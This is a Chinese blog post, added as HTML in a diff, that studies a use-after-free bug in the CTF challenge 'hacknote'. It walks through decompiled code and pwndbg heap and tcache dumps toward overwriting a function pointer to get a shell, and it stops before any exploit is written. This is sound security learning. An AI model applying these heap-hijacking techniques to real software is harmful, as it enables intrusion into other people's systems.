@@ -1,0 +1,570 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Pwn" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/540e5c20.html">
+
+
+
+  <title>
+Pwn学习笔记（10）--UAF - Pwn手的自我修养 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Pwn学习笔记（10）--UAF
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-11-05 11:47:12">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-11-05T11:47:12+08:00">2024-11-05</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://s2.loli.net/2024/11/05/hQ5dotLSvj7m96u.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Pwn/" itemprop="item" rel="index" title="分类于 Pwn手的自我修养"><span itemprop="name">Pwn手的自我修养</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/540e5c20.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="pwn学习笔记10uaf"><a class="markdownIt-Anchor" href="#pwn学习笔记10uaf">#</a> Pwn 学习笔记（10）–UAF：</h1>
+<p>​		UAF 就是 Use-After-Free，即一个指向堆块的指针被释放后指针没有置零，形成了悬空指针，使得堆可以再次被使用。</p>
+<p>​		由于我环境似乎运行不了某个程序，所以演示就不做了，上个简单题来看看。</p>
+<p>​		题目是一个标准的菜单题，有创建 note 和输出删除的功能，别的不看了，直接看那三个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;notelist + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		先分配了一个堆空间，具体大小为数组 notelist 的单个元素的大小，之后就是让 noteliist 第一个元素指向一个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br></pre></td></tr></table></figure>
+<p>​		估计第一个参数是一个函数指针，之后 malloc 第二个堆，地址赋给第二个参数，之后读取 size 大小的字符进入第二个堆块。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">*(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br></pre></td></tr></table></figure>
+<p>​		删除 note：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;notelist + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		发现先后删除了两个堆块，一个是写入的堆块，也就是上面第二个生成的堆块，之后释放了第一个生成的堆块，也就是存放两个指针的那个堆块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">free</span>(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure>
+<p>​		但之后没有对指针进行置零，存在 UAF 漏洞，因为 show 里存在 idx 参数，释放后如果申请大小差不多的堆块。</p>
+<p>​		之后是 print_note 函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​		很显然，这里调用了那个堆块里的动态函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure>
+<p>​		所以只需要想办法修改这里的函数指针即可 getshell。</p>
+<p>​		上 gdb 调一下，先申请两个堆块，之后 ctrl+c 执行 gdb 指令看看：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /mnt/c/Users/20820/Downloads/hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :20</span><br><span class="line">Content :aaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :30</span><br><span class="line">Content :AAA</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure>
+<p>​		之后查看下 heap 状态：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure>
+<p>​		除开最开始的那个 size 为 0x190 的那位以外，其他的大致符合情况 ，两次都是先申请了一个堆块存放两个地址，然后申请另一个堆块来存放输入的内容，之后读一下 0x804b198 的内存：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b1b00804865b		&lt;---这里两个数据，一个是函数指针，也就是0x0804865b，另一个就是输入地址的那个堆块的地址0x0804b1b0</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x000000000a616161</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1e00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x000000000a414141</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>​		这个函数在 IDA 里的地址是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0804865B print_note_content proc near            ; DATA XREF: add_note+9A↓o</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B arg_0           = dword ptr  8</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B ; __unwind &#123;</span><br><span class="line">.text:0804865B                 push    ebp</span><br><span class="line">.text:0804865C                 mov     ebp, esp</span><br><span class="line">.text:0804865E                 sub     esp, 8</span><br><span class="line">.text:08048661                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08048664                 mov     eax, [eax+4]</span><br><span class="line">.text:08048667                 sub     esp, 0Ch</span><br><span class="line">.text:0804866A                 push    eax             ; s</span><br><span class="line">.text:0804866B                 call    _puts</span><br><span class="line">.text:08048670                 add     esp, 10h</span><br><span class="line">.text:08048673                 nop</span><br><span class="line">.text:08048674                 leave</span><br><span class="line">.text:08048675                 retn</span><br><span class="line">.text:08048675 ; &#125; // starts at 804865B</span><br><span class="line">.text:08048675 print_note_content endp</span><br></pre></td></tr></table></figure>
+<p>​		此时 bins 里啥都没有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+<p>​		之后，我们分别释放掉两个堆，发现 heap 变了：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x804b1a0</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure>
+<p>​		释放掉了之后，读取 0x804b198 的内容：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b01000000000</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b0100804b1a0</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>​		再看看这个：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">tcachebins</span><br><span class="line">0x10 [  2]: 0x804b1d0 —▸ 0x804b1a0 ◂— 0</span><br><span class="line">0x20 [  1]: 0x804b1b0 ◂— 0</span><br><span class="line">0x30 [  1]: 0x804b1e0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+<p>​		完蛋，没注意到 tcache 给我保存了这些内容，不过不清楚是否存在影响，继续调一调看看吧，之后重新申请个堆</p>
